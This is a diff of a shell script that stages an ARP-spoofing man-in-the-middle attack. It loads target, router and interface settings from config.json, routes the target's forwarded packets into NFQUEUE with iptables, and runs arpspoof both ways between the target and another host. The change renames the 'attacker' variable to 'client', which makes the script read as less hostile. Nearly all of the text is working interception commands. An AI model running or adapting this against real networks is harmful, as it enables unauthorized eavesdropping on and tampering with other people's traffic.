@@ -7,7 +7,7 @@ fi
 
 target=$(jq -r '.target' config.json)
 router=$(jq -r '.router' config.json)
-attacker=$(jq -r '.attacker' config.json)
+client=$(jq -r '.client' config.json)
 interface=$(jq -r '.interface' config.json)
 
 trap 'end' INT
@@ -27,9 +27,9 @@ sudo iptables -A FORWARD -d $target -j NFQUEUE --queue-num 0
 sudo iptables -A FORWARD -s $target -j NFQUEUE --queue-num 0
 
 # Start arpspoof commands in the background
-arpspoof -i $interface -t $target $attacker > /dev/null 2>&1 &
+arpspoof -i $interface -t $target $client > /dev/null 2>&1 &
 PID1=$!
-arpspoof -i $interface -t $attacker $target > /dev/null 2>&1 &
+arpspoof -i $interface -t $client $target > /dev/null 2>&1 &
 PID2=$!
 
 cat
